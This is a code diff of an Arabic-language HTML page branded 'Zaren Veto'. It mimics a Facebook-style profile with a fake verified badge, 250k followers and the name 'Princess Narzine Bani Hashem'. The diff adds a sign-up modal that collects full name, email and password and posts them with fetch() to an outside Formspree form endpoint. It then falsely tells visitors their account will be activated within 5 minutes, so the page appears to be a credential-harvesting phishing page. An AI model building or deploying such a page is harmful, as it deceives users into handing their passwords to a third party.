@@ -4,124 +4,150 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zaren Veto | المنصة الرسمية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
-        body { background-color: var(--fb-bg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        :root { --zv-blue: #1877f2; --zv-bg: #f0f2f5; }
+        body { background-color: var(--zv-bg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
         
         /* شريط التنقل */
-        .nav-bar { background: white; height: 56px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; direction: ltr; }
-        .app-logo-blue { font-weight: bold; color: var(--fb-blue); font-size: 28px; text-decoration: none; letter-spacing: -1.2px; }
-        .nav-icons { display: flex; gap: 12px; }
-        .nav-btn { color: #1c1e21; background: #e4e6eb; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: none; font-size: 18px; }
+        .nav-bar { background: white; height: 65px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; direction: ltr; }
+        .nav-left { display: flex; align-items: center; gap: 12px; }
+        .app-title-fanni { font-family: 'Dancing Script', cursive; font-size: 32px; color: var(--zv-blue); text-decoration: none; }
+        .nav-icons { display: flex; gap: 15px; }
+        .nav-btn { background: #e4e6eb; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: none; }
 
-        .main-wrapper { max-width: 940px; margin: 0 auto; background: white; min-height: 100vh; }
+        .main-container { max-width: 900px; margin: 0 auto; background: white; min-height: 100vh; }
+        .cover-photo { width: 100%; height: 300px; background: #cbd0d8 url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000') center/cover; }
 
-        /* الغلاف المعتمد */
-        .cover-photo-area { 
-            width: 100%; aspect-ratio: 820 / 312; 
-            background: #cbd0d8 url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000') center/cover; 
-            position: relative; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px; 
-        }
-
-        /* الهوية والحافة الزرقاء */
-        .profile-section { display: flex; flex-direction: column; align-items: center; text-align: center; margin-top: -90px; padding-bottom: 20px; }
-        .avatar-box { position: relative; width: 168px; height: 168px; }
-        .avatar-circle { 
-            width: 100%; height: 100%; border-radius: 50%; 
-            border: 4px solid var(--fb-blue); /* الحافة الزرقاء */
-            background: white; overflow: hidden; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
-        }
+        /* الهوية الملكية والحافة الزرقاء */
+        .profile-section { display: flex; flex-direction: column; align-items: center; margin-top: -95px; padding-bottom: 30px; position: relative; }
+        .avatar-holder { position: relative; width: 175px; height: 175px; }
+        .avatar-circle { width: 100%; height: 100%; border-radius: 50%; border: 5px solid var(--zv-blue); background: white; overflow: hidden; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
         .avatar-circle img { width: 100%; height: 100%; object-fit: cover; }
+        .mini-logo { position: absolute; top: -12px; left: 50%; transform: translateX(-50%); width: 30px; height: 30px; background: white; border-radius: 50%; padding: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); z-index: 20; }
 
-        /* الاسم والتوثيق */
-        .name-container { display: flex; align-items: center; justify-content: center; margin-top: 15px; direction: ltr; }
-        .display-name { font-size: 32px; font-weight: 700; color: #050505; margin: 0; display: flex; align-items: center; gap: 8px; }
-        .v-badge { color: var(--fb-blue); width: 26px; height: 26px; }
+        /* الاسم في سطر واحد */
+        .name-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 18px; width: 100%; white-space: nowrap; padding: 0 15px; box-sizing: border-box; }
+        .user-name { font-size: clamp(20px, 5vw, 28px); font-weight: 800; color: #050505; margin: 0; }
+        .verified-icon { color: var(--zv-blue); width: 26px; height: 26px; flex-shrink: 0; }
 
-        .stats { color: #65676b; font-size: 17px; font-weight: 600; margin: 8px 0; }
-
-        /* الإعدادات المحمية */
-        .settings-dropdown { display: none; position: absolute; top: 60px; left: 16px; background: white; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); width: 280px; z-index: 2000; padding: 10px; text-align: right; border: 1px solid #ddd; }
-        .settings-item { padding: 12px; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 12px; font-weight: 600; color: #050505; }
-        .settings-item:hover { background: #f2f2f2; }
-        .settings-item i { width: 20px; font-size: 18px; color: #1c1e21; }
-
-        .btn-fb { background: var(--fb-blue); color: white; border: none; padding: 10px 40px; border-radius: 6px; font-weight: 600; cursor: pointer; }
-        #toast { visibility: hidden; background: #333; color: #fff; padding: 12px 24px; border-radius: 8px; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 5000; }
-        #toast.show { visibility: visible; animation: fade 3s; }
-        @keyframes fade { 0%, 100% {opacity:0;} 10%, 90% {opacity:1;} }
+        /* النوافذ المنبثقة */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 5000; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
+        .modal-content { background: white; padding: 30px; border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn-action { background: var(--zv-blue); color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        .error-msg { color: #fa3e3e; font-size: 14px; font-weight: bold; margin-bottom: 10px; display: none; }
     </style>
 </head>
 <body>
 
 <nav class="nav-bar">
-    <a href="#" class="app-logo-blue">Zaren Veto</a>
+    <div class="nav-left">
+        <img src="https://via.placeholder.com/35" alt="Logo" style="width:35px;">
+        <a href="#" class="app-title-fanni">Zaren Veto</a>
+    </div>
     <div class="nav-icons">
-        <button class="nav-btn" title="الإعدادات والروابط" onclick="toggleSettings()"><i class="fas fa-cog"></i></button>
-        <button class="nav-btn" onclick="location.reload()"><i class="fas fa-sync-alt"></i></button>
+        <button class="nav-btn" onclick="openM('blockM')"><i class="fas fa-user-slash"></i></button>
+        <button class="nav-btn" onclick="openM('regM')"><i class="fas fa-user-plus"></i></button>
     </div>
 </nav>
 
-<div class="settings-dropdown" id="settingsMenu">
-    <div class="settings-item" onclick="copyLink()">
-        <i class="fas fa-link"></i> <span>نسخ رابط الصفحة الرسمية</span>
-    </div>
-    <div class="settings-item" onclick="window.scrollTo({top:0, behavior:'smooth'}); toggleSettings();">
-        <i class="fas fa-home"></i>
-        <span>الرجوع للرئيسية</span>
-    </div>
-    <hr style="border:0.5px solid #eee;">
-    <div class="settings-item" style="color: #d33;" onclick="localStorage.clear(); location.reload();">
-        <i class="fas fa-sign-out-alt"></i>
-        <span>تسجيل الخروج الآمن</span>
-    </div>
-</div>
-
-<div class="main-wrapper">
-    <div class="cover-photo-area"></div>
+<div class="main-container">
+    <div class="cover-photo"></div>
     <div class="profile-section">
-        <div class="avatar-box">
+        <div class="avatar-holder">
+            <img src="https://via.placeholder.com/30" class="mini-logo" alt="Icon">
             <div class="avatar-circle">
-                <img src="https://via.placeholder.com/168" alt="Narzine">
+                <img src="https://via.placeholder.com/175" alt="Narzine">
             </div>
         </div>
-        <div class="name-container">
-            <h1 class="display-name">
-                Princess Narzine Bani Hashem
-                <svg class="v-badge" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M22.5 12.5c0-1.58-.8-3.04-2.12-3.88.59-1.58.2-3.38-1.01-4.59s-3.01-1.6-4.59-1.01C13.94 1.7 12.48.9 10.9.9s-3.04.8-3.88 2.12c-1.58-.59-3.38-.2-4.59 1.01s-1.6 3.01-1.01 4.59C.7 10.06-.1 11.52-.1 13.1s.8 3.04 2.12 3.88c-.59 1.58-.2 3.38 1.01 4.59s3.01 1.6 4.59 1.01c.84 1.32 2.3 2.12 3.88 2.12s3.04-.8 3.88-2.12c1.58.59 3.38.2 4.59-1.01s1.6-3.01 1.01-4.59c1.32-.84 2.12-2.3 2.12-3.88zM10.69 17.5l-4-4 1.41-1.41 2.59 2.58 6.58-6.59 1.41 1.41-7.99 8.01z"/>
-                </svg>
-            </h1>
+        <div class="name-row">
+            <h1 class="user-name">Princess Narzine Bani Hashem</h1>
+            <svg class="verified-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M22.5 12.5c0-1.58-.8-3.04-2.12-3.88.59-1.58.2-3.38-1.01-4.59s-3.01-1.6-4.59-1.01C13.94 1.7 12.48.9 10.9.9s-3.04.8-3.88 2.12c-1.58-.59-3.38-.2-4.59 1.01s-1.6 3.01-1.01 4.59C.7 10.06-.1 11.52-.1 13.1s.8 3.04 2.12 3.88c-.59 1.58-.2 3.38 1.01 4.59s3.01 1.6 4.59 1.01c.84 1.32 2.3 2.12 3.88 2.12s3.04-.8 3.88-2.12c1.58.59 3.38.2 4.59-1.01s1.6-3.01 1.01-4.59c1.32-.84 2.12-2.3 2.12-3.88zM10.69 17.5l-4-4 1.41-1.41 2.59 2.58 6.58-6.59 1.41 1.41-7.99 8.01z"/></svg>
         </div>
-        <div class="stats">250k followers • 0 following</div>
-        <button class="btn-fb">متابعة</button>
+        <p style="color:#65676b; font-weight:600; margin-top:10px;">250k followers • 0 following</p>
+        <button class="btn-action" style="width: auto; padding: 10px 40px;">Follow</button>
     </div>
 </div>
 
-<div id="toast">تم نسخ الرابط بنجاح!</div>
+<div class="modal" id="regM">
+    <div class="modal-content" id="formContainer">
+        <h2 style="color:var(--zv-blue);">إنشاء حساب جديد</h2>
+        <div id="blockError" class="error-msg">عذراً، هذا الاسم محظور من قبل الإدارة.</div>
+        
+        <form id="zarenForm">
+            <input type="text" id="uName" name="full_name" placeholder="الاسم الكامل" required>
+            <input type="email" id="uEmail" name="email" placeholder="البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-action">إرسال طلب التفعيل</button>
+        </form>
+        <button onclick="closeM('regM')" style="background:none; border:none; color:gray; cursor:pointer; margin-top:15px;">إلغاء</button>
+    </div>
+
+    <div class="modal-content" id="successMsg" style="display:none;">
+        <i class="fas fa-check-circle" style="font-size: 50px; color: #28a745; margin-bottom: 15px;"></i>
+        <h2 style="color:#28a745;">تم استلام طلبك!</h2>
+        <p style="font-weight:bold; color:#444;">مرحباً بك في Zaren Veto.</p>
+        <p style="color:#666; line-height:1.6;">لقد أرسلنا بياناتك للإدارة. سيتم مراجعة الطلب و **تفعيل حسابك خلال 5 دقائق** من الآن.</p>
+        <button onclick="location.reload()" class="btn-action">حسناً</button>
+    </div>
+</div>
+
+<div class="modal" id="blockM">
+    <div class="modal-content">
+        <h2 style="color:#fa3e3e;">إدارة الحظر</h2>
+        <input type="text" id="bInput" placeholder="اكتب الاسم المراد حظره...">
+        <button class="btn-action" style="background:#fa3e3e;" onclick="addBlock()">تأكيد الحظر</button>
+        <button onclick="closeM('blockM')" style="background:none; border:none; color:gray; cursor:pointer; margin-top:15px;">إغلاق</button>
+    </div>
+</div>
 
 <script>
-    function toggleSettings() {
-        const m = document.getElementById('settingsMenu');
-        m.style.display = (m.style.display === 'block') ? 'none' : 'block';
-    }
+    // نظام الحظر
+    let blacklist = JSON.parse(localStorage.getItem('zv_blacklist')) || [];
 
-    function copyLink() {
-        navigator.clipboard.writeText(window.location.href).then(() => {
-            const t = document.getElementById('toast');
-            t.className = "show";
-            setTimeout(() => t.className = "", 3000);
-            toggleSettings();
-        });
-    }
+    function openM(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeM(id) { document.getElementById(id).style.display = 'none'; }
 
-    // إغلاق القائمة عند الضغط خارجها لزيادة الحماية
-    window.onclick = function(event) {
-        if (!event.target.closest('.nav-btn')) {
-            document.getElementById('settingsMenu').style.display = 'none';
+    function addBlock() {
+        const name = document.getElementById('bInput').value.trim().toLowerCase();
+        if(name && !blacklist.includes(name)) {
+            blacklist.push(name);
+            localStorage.setItem('zv_blacklist', JSON.stringify(blacklist));
+            alert("تم إدراج الاسم في قائمة الحظر.");
         }
+        closeM('blockM');
     }
+
+    // معالجة النموذج والإرسال
+    document.getElementById('zarenForm').onsubmit = function(e) {
+        e.preventDefault();
+        const nameInput = document.getElementById('uName').value.trim().toLowerCase();
+        
+        // التحقق من الحظر
+        if(blacklist.includes(nameInput)) {
+            document.getElementById('blockError').style.display = 'block';
+            return;
+        }
+
+        // إرسال البيانات إلى Formspree
+        const formData = new FormData(this);
+        fetch('https://formspree.io/f/xvzdgokp', {
+            method: 'POST',
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+        }).then(response => {
+            if (response.ok) {
+                // إظهار رسالة الـ 5 دقائق فوراً
+                document.getElementById('formContainer').style.display = 'none';
+                document.getElementById('successMsg').style.display = 'block';
+            } else {
+                alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
+            }
+        });
+    };
 </script>
+
 </body>
 </html>
